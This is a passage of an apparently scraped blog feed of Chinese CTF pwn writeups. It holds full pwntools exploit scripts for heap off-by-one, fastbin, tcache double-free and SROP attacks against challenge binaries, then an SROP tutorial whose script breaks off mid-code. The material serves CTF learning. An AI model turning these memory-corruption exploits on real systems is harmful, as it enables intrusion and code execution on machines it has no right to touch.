gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><h2 id="simpleHeap"><a href="#simpleHeap" class="headerlink" title="simpleHeap"></a>simpleHeap</h2><p>off-by-one漏洞，利用堆块重叠修改下一个堆块的size，造成overlap，可leak出libc_addr,再利用overlap进行fastbin attack，修改malloc_hook为one_gadget。但是此处所有的one_gadget条件均不满足，因此需要利用realloc函数调整栈帧。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'vn.node3.buuoj.cn'</span>,<span class="number">52145</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(lenght,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(lenght))</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'\x00'</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x58</span>,<span class="string">'\x00'</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'\x00'</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x18</span>+<span class="string">'\xd1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'A'</span>) <span class="comment"># 1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) <span class="number">-0x3c4c41</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span>  </span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># free fastbin</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">11</span>+p64(one_gadget)+p64(realloc+<span class="number">14</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,str(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h2><p>ubuntu18.04的uaf漏洞，有tcache机制，限制了free的次数为3，申请一个0x88的堆块释放两次，可以先利用Tcache dup泄露Heap address，然后再申请劫持Tcache structure，向任意地址读写，向malloc_hook写one_gadget完成利用，但是此处所有的one_gadget条件均不满足，因此需要利用realloc函数调整栈帧才能利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line">p.sendafter(<span class="string">'content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'4'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">p = process(<span class="string">'vn_pwn_easyTHeap'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 1</span></span><br><span class="line"> </span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'heap_addr'</span>,heap_addr))</span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_addr<span class="number">-0x250</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3ebca0</span></span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'libc_base'</span>,libc_base))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(malloc_hook<span class="number">-0x8</span>))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 5</span></span><br><span class="line">edit(<span class="number">5</span>,p64(one_gadget)+p64(realloc+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x66</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   rcx == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f322 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x40] == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x10a38c execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x70] == NULL</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;V-amp-N招新赛writeup&quot;&gt;&lt;a href=&quot;#V-amp-N招新赛writeup&quot; class=&quot;headerlink&quot; title=&quot;V&amp;amp;N招新赛writeup&quot;&gt;&lt;/a&gt;V&amp;amp;N招新赛writeup&lt;/h1&gt;&lt;p&gt;参考链接:&lt;a hr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>SROP</title>
    <link href="https://nocbtm.github.io/2020/02/28/SROP/"/>
    <id>https://nocbtm.github.io/2020/02/28/SROP/</id>
    <published>2020-02-28T09:27:56.000Z</published>
    <updated>2020-04-11T13:41:49.269Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是SROP"><a href="#什么是SROP" class="headerlink" title="什么是SROP"></a>什么是SROP</h2><p><code>SROP</code> 全称<code>Sigreturn Oriented Programming</code>，<code>sigreturn</code>是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用。</p><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。一般来说，信号机制常见的步骤如下图所示：</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-1.png" class="lozad"></p><p>包含的流程包括：</p><ol><li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li><li>内核会为该进程保存相应的上下文，将当前的信息压入栈中（栈寄存器等），以及将 sigreturn系统调用地址压入栈中。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</li><li>执行 sigreturn 系统调用，恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119，64 位的系统调用号为 15。</li></ol><p>保存在栈中的进程上下文信息为<code>ucontext_t</code>结构体，称其为<code>Signal Frame</code>，其结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// defined in /usr/include/sys/ucontext.h</span></span><br><span class="line"><span class="comment">/* Userlevel context.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> uc_flags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span> *<span class="title">uc_link</span>;</span></span><br><span class="line">    <span class="keyword">stack_t</span> uc_stack;           <span class="comment">// the stack used by this context</span></span><br><span class="line">    <span class="keyword">mcontext_t</span> uc_mcontext;     <span class="comment">// the saved context</span></span><br><span class="line">    <span class="keyword">sigset_t</span> uc_sigmask;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpstate</span> __<span class="title">fpregs_mem</span>;</span></span><br><span class="line">  &#125; <span class="keyword">ucontext_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// defined in /usr/include/bits/types/stack_t.h</span></span><br><span class="line"><span class="comment">/* Structure describing a signal stack.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ss_sp;</span><br><span class="line">    <span class="keyword">size_t</span> ss_size;</span><br><span class="line">    <span class="keyword">int</span> ss_flags;</span><br><span class="line">  &#125; <span class="keyword">stack_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// difined in /usr/include/bits/sigcontext.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由于<code>Signal Frame</code>是在用户态的栈中，因此若在栈中伪造<code>Signal Frame</code>，同时调<code>sigreturn</code>系统调用，即可实现对所有寄存器的控制包括rip，从而实现攻击。</p><p>如若只想调用执行一个函数，如get shell，则可直接将rip指向system，将rdi指向binsh地址即可，如下图所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-2.png" class="lozad"></p><p>如果想执行一系列函数，我们可以通过rsp指针来实现相应的rop链，包括两个步骤：</p><ul><li>控制栈指针。</li><li>把原来 rip 指向的syscall gadget 换成syscall; ret gadget。</li></ul><p>示意图如下所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-3.png" class="lozad"></p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>以V&amp;N招新赛babypwn为例</p><p>思路如下：</p><p>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        